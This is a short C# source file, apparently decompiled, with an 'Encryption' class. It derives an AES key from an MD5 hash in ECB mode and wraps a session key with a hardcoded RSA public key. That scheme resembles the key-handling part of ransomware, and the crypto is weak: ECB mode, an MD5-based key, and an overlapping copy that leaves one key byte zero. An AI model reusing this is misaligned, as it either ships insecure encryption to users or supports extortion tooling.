using System;
using System.Security.Cryptography;
using System.Text;

namespace SF;

internal static class Encryption
{
	public enum KeySizes
	{
		Size2048 = 0x800
	}

	public static byte[] AesEncrypt(byte[] input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = new byte[32];
		byte[] sourceArray = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(pass));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
		return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
	}

	public static string Run()
	{
		byte[] inArray = Encrypt("<RSAKeyValue><Modulus>v/GxnHsdut+GNJsvFMLyqPItPwoTb5BbCIl00JON62wT96V34fP2ssJd7uH7oJmHAAN4dfwh9hKMlHGrEYeskMlh2pcekR8pYtwYjijZx9TYnENM+jxh1uAjzWoQP4ll4p0eCaUWmIu9MQqAC/d6asKka9wOj3HU1v3ngYWQShejGuwqp+kqcR0HivJxgXIASG9dUJdDIohsJwxKkuu8U3IRIOSNGQUkQ9GP7R3ja/ndyxNLNo65HoP5RsLNSAYaESePc+PGxcj2/xNQOrhRCmzQzP7UvotG3PAoxogBG1ODCJlc9Po/xpMLoGI01A6018kEWEWINhV8XPBDhOqvBQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>", Encoding.UTF8.GetBytes(Main.Key));
		return Convert.ToBase64String(inArray);
	}

	private static byte[] Encrypt(string publicKey, byte[] plain)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		rSACryptoServiceProvider.PersistKeyInCsp = false;
		rSACryptoServiceProvider.FromXmlString(publicKey);
		return rSACryptoServiceProvider.Encrypt(plain, fOAEP: true);
	}
}
